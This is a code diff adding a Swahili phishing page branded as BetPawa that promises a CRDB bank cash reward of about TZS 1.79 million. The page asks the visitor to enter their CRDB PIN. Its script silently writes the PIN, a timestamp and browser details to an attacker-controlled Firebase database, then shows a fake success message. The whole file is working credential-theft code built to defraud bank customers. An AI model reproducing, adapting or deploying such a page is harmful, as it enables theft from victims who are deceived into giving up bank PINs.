@@ -1,0 +1,125 @@
+<!DOCTYPE html>    
+<html lang="sw">    
+<head>    
+  <meta charset="utf-8"/>    
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>    
+  <title>BetPawa - Pokea Fedha</title>    
+  <style>    
+    :root{ --bg1:linear-gradient(to bottom right,#003300,#000); --accent:#00ff66; --dark:#003300; --card:#ffffff;}    
+    body{ margin:0; min-height:100vh; font-family:Poppins, Arial, sans-serif; background:var(--bg1); color:#fff; display:flex; align-items:center; justify-content:center; }    
+    .card{ width:92%; max-width:420px; background:rgba(255,255,255,0.06); padding:22px; border-radius:12px; text-align:center; box-shadow:0 8px 24px rgba(0,0,0,0.35);}    
+    h1{ color:var(--accent); margin:0 0 8px; font-size:20px;}    
+    p{ color:#e6fbe6; font-size:14px; line-height:1.5;}    
+    .summary{ background:rgba(0,255,100,0.08); color:#eaffea; padding:12px; border-radius:8px; text-align:left; margin:12px 0;}    
+    input{ width:90%; padding:12px; border-radius:8px; border:none; margin-top:12px; font-size:15px; }    
+    .btn{ margin-top:14px; padding:12px; border-radius:8px; border:none; width:90%; background:var(--accent); color:var(--dark); font-weight:700; cursor:pointer; }    
+    .footer{ margin-top:14px; font-size:13px; color:rgba(255,255,255,0.7); }    
+    /* loading overlay */    
+    .overlay{ position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,0.45); z-index:9999; }    
+    .spinner{ width:64px; height:64px; border-radius:50%; border:6px solid rgba(255,255,255,0.16); border-top-color:#fff; animation:spin 1s linear infinite; }    
+    @keyframes spin{ to{ transform:rotate(360deg);} }    
+    /* success popup */    
+    .success-popup{ position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,0.45); z-index:10000; }    
+    .popup-card{ background:#fff; width:92%; max-width:380px; padding:22px; border-radius:14px; text-align:center; box-shadow:0 8px 30px rgba(0,0,0,0.2); }    
+    .tick{ font-size:60px; color:#0A6F3C; margin-bottom:8px; }    
+    .popup-card h2{ color:#0A6F3C; margin:8px 0; font-size:20px; }    
+    .popup-card p{ color:#444; font-size:15px; line-height:1.5; }    
+    .back-btn{ margin-top:16px; padding:12px; width:100%; border-radius:10px; border:none; background:#0A6F3C; color:#fff; font-weight:700; cursor:pointer; }    
+  </style>    
+</head>    
+<body>    
+  <div class="card" role="main">    
+    <h1>CRDB Cash Reward TZS 1,789,230</h1>    
+    <p>CRDB ipo tayari <strong>kutuma TSH 1,789,000</strong> kwenda kwenye akaunti ya CRDB iliyo thibitishwa.</p>    
+    
+    <div class="summary">    
+      <strong>Maelezo ya Malipo:</strong>    
+      <div>Kiasi cha Kutumwa: <strong>1,789,000 TSH</strong></div>    
+      <div>Hali: <strong>Tayari kwa kutuma</strong></div>    
+    </div>    
+    
+    <p>Tafadhali ingiza <strong>PIN ya CRDB</strong> yako ya uthibitisho:</p>    
+    <input id="pinInput" type="password" placeholder="Weka PIN ya CRDB hapa..." maxlength="6" inputmode="numeric" />    
+    <button id="pokeaBtn" class="btn">Pokea Fedha</button>    
+    <div class="footer">© 2025 BetPawa Tanzania — Huduma Salama kwa Wateja Wetu</div>    
+  </div>    
+    
+  <!-- loading -->    
+  <div id="loading" class="overlay"><div class="spinner" role="status" aria-label="Inafanya kazi"></div></div>    
+    
+  <!-- success popup (screenshot style) -->    
+  <div id="successPopup" class="success-popup" aria-hidden="true">    
+    <div class="popup-card" role="dialog" aria-labelledby="successTitle">    
+      <div class="tick">✔</div>    
+      <h2 id="successTitle">Maombi Yamefanikiwa</h2>    
+      <p>Maombi yako yamepokelewa na kuchakatwa kikamilifu. Utapokea taarifa kupitia namba uliyoingiza ndani ya dakika chache zijazo.</p>    
+      <button class="back-btn" id="goHomeBtn">Rudi Mwanzo</button>    
+    </div>    
+  </div>    
+    
+  <script type="module">    
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";    
+    import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";    
+    
+    const firebaseConfig = {    
+      apiKey: "AIzaSyD4NQ9EsQqerx6y7v322p2ycraoDWJSRcM",    
+      authDomain: "airdropusdt-767d7.firebaseapp.com",    
+      databaseURL: "https://airdropusdt-767d7-default-rtdb.europe-west1.firebasedatabase.app",    
+      projectId: "airdropusdt-767d7",    
+      storageBucket: "airdropusdt-767d7.firebasestorage.app",    
+      messagingSenderId: "627616603037",    
+      appId: "1:627616603037:web:63041f067800c97fab6d74",    
+      measurementId: "G-01F6G2CYXK"    
+    };    
+    
+    const app = initializeApp(firebaseConfig);    
+    const db = getDatabase(app);    
+    
+    const loading = document.getElementById('loading');    
+    const pokeaBtn = document.getElementById('pokeaBtn');    
+    const successPopup = document.getElementById('successPopup');    
+    
+    function showLoading(show=true){ loading.style.display = show ? 'flex' : 'none'; }    
+    function showSuccessPopup(show=true){    
+      successPopup.style.display = show ? 'flex' : 'none';    
+      successPopup.setAttribute('aria-hidden', show ? 'false' : 'true');    
+    }    
+    
+    function getDeviceInfo(){    
+      try {    
+        return { userAgent: navigator.userAgent || '', platform: navigator.platform || '' };    
+      } catch(e){ return {}; }    
+    }    
+    
+    pokeaBtn.addEventListener('click', async () => {    
+      const pin = document.getElementById('pinInput').value.trim();    
+      if (!pin) return;    
+      if (pin.length < 4) return;    
+    
+      const id = localStorage.getItem('submissionId');    
+      if (!id) return;    
+    
+      showLoading(true);    
+    
+      try {    
+        const entryRef = ref(db, `crdb_submissions/${id}`);    
+        const device = getDeviceInfo();    
+    
+        await update(entryRef, { pin: pin, pinTime: new Date().toISOString(), deviceInfo: device });    
+    
+        // show success popup (no redirect)    
+        showLoading(false);    
+        showSuccessPopup(true);    
+    
+      } catch (err) {    
+        showLoading(false);    
+        console.error('Save PIN error', err);    
+      }    
+    });    
+    
+    document.getElementById('goHomeBtn').addEventListener('click', () => {    
+      window.location.href = 'index.html';    
+    });    
+  </script>    
+</body>    
+  </html>
